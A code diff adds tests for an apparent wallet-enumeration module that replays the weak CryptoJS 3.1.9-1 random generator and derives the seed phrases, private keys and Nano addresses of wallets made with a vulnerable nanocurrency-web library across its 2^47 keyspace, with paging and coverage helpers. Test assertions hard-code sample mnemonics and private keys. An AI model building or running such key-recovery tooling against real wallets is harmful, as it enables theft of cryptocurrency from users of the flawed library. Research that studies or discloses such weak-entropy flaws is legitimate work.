@@ -239,3 +239,108 @@ test('keyspace metadata reports the full page count and honest coverage', () => 
   );
   assert.equal(info.coverageDisplay, '0.00000%');
 });
+
+test('ill-nan models the 2^47 CryptoJS keyspace', async () => {
+  const ill = await import('../src/lib/illnan.ts');
+  assert.equal(ill.ILLNAN_ENTROPY_BYTES, 32);
+  assert.equal(ill.ILLNAN_WORD_COUNT, 24);
+  assert.equal(ill.ILLNAN_SEED_BITS, 32);
+  assert.equal(ill.ILLNAN_SIGN_BITS, 15);
+  assert.equal(ill.ILLNAN_BITS, 47);
+  assert.equal(ill.ILLNAN_TOTAL, 1n << 47n);
+  assert.equal(ill.illnanTotalEntries(), 1n << 47n);
+  assert.equal(ill.illnanTotalPages(), ((1n << 47n) + 19n) / 20n);
+  assert.equal(ill.illnanPageStartPosition(1n), 0n);
+  assert.equal(ill.illnanPageStartPosition(2n), 20n);
+  assert.equal(ill.illnanPageForPosition(20n), 2n);
+  assert.equal(ill.illnanClampPage(0n, 100n), 1n);
+  assert.equal(ill.illnanClampPage(999n, 100n), 100n);
+  assert.equal(ill.illnanClampPage(50n, 100n), 50n);
+  assert.equal(ill.illnanPageLocationPercent(1n, 100n), 1);
+  assert.equal(ill.illnanPageLocationPercent(50n, 100n), 50);
+
+  // Low 32 position bits are the MWC seed; the next 15 are sign bits.
+  const { seed, signMask } = ill.illnanSeedAndSigns(0x12345678n | (0b101010101010101n << 32n));
+  assert.equal(seed, 0x12345678);
+  assert.equal(signMask, 0b101010101010101);
+});
+
+test('ill-nan replays CryptoJS 3.1.9-1 WordArray.random byte-for-byte', async () => {
+  const ill = await import('../src/lib/illnan.ts');
+  const CryptoJS = (await import('crypto-js')).default;
+
+  function withControlledRandom(seed: number, signMask: number, nBytes: number, fn: () => string) {
+    const calls: number[] = [(seed + 0.25) / 0x100000000];
+    for (let i = 0; i < (nBytes / 4) * 2; i++) {
+      calls.push(((signMask >>> i) & 1) === 1 ? 0.75 : 0.25);
+    }
+    let index = 0;
+    const original = Math.random;
+    Math.random = () => {
+      if (index >= calls.length) throw new Error('unexpected extra Math.random call');
+      return calls[index++];
+    };
+    try {
+      const value = fn();
+      return { value, callsUsed: index };
+    } finally {
+      Math.random = original;
+    }
+  }
+
+  const cases = [
+    [0x12345678, 0b101010101010101],
+    [0, 0],
+    [0xffffffff, 0b111111111111111],
+    [0x80000000, 0b010101010101010],
+  ];
+
+  for (const [seed, signMask] of cases) {
+    for (const nBytes of [32, 16]) {
+      const { value, callsUsed } = withControlledRandom(seed, signMask, nBytes, () =>
+        CryptoJS.lib.WordArray.random(nBytes).toString(),
+      );
+      const ours = Buffer.from(ill.cryptoJsWordArrayRandom(seed, signMask, nBytes)).toString('hex');
+      assert.equal(ours, value, `nBytes=${nBytes}, seed=${seed}, signs=${signMask}`);
+      assert.equal(callsUsed, 1 + (nBytes / 4) * 2);
+    }
+  }
+});
+
+test('ill-nan derives the vulnerable nanocurrency-web-js wallet', async () => {
+  const ill = await import('../src/lib/illnan.ts');
+  const row = await ill.illnanDerivePrivateKey(0n);
+
+  assert.equal(row.position, 0n);
+  assert.equal(row.mnemonic!.split(' ').length, 24);
+  assert.equal(
+    row.mnemonic,
+    'illness blossom abandon metal meadow post room rib cluster fiscal scene version east ceiling buffalo story guard glad weasel trophy alcohol lady ramp want',
+  );
+  assert.equal(row.privateKeyHex, '3da227deefddfe45d14639ed6487d4b0ce7d8227369a6da50ebe19a66dd98f0c');
+  assert.equal(row.publicKeyHex, 'F956B285BADBEF16EC18CC28901AB0F3EF0F227D9C1DBEF81CE6C9BC4929BB87');
+  assert.equal(row.address, 'nano_3ycppc4uopzh4up3jm3ak1fd3wzh3wj9u91xquw3sspbqj6kmgw976tep9t8');
+  assert.equal(row.accountIndex, 0);
+  assert.equal(row.path, "m/44'/165'/0'");
+
+  // Generated with nanocurrency-web@1.4.3 under the same controlled stream.
+  const mid = await ill.illnanDerivePrivateKey(0xdeadbeefn | (0b001100110011001n << 32n));
+  assert.equal(
+    mid.mnemonic,
+    'crawl little cage crisp bronze recipe awesome design net blur fault dentist patient rhythm lobster print direct apple search group tonight upon ice thought',
+  );
+  assert.equal(mid.privateKeyHex, '031b1b04588583cb19d07b8a668d6998a8d105ae01b59c27786f53ed8bf6c2bf');
+  assert.equal(mid.address, 'nano_14ykcgnmdrm4sbhjjekmba6du3nmbtpqweorkgb6qez8rgzw9wg9k9fufe6m');
+
+  // Distinct positions must produce distinct wallets.
+  const second = await ill.illnanDerivePrivateKey(1n);
+  assert.notEqual(second.address, row.address);
+  assert.notEqual(second.mnemonic, row.mnemonic);
+});
+
+test('ill-nan rejects positions outside the 2^47 range', async () => {
+  const ill = await import('../src/lib/illnan.ts');
+  await assert.rejects(() => ill.illnanDerivePrivateKey(-1n), /out of vulnerable range/);
+  await assert.rejects(() => ill.illnanDerivePrivateKey(1n << 47n), /out of vulnerable range/);
+  assert.throws(() => ill.illnanSeedAndSigns(1n << 47n), /out of vulnerable range/);
+});
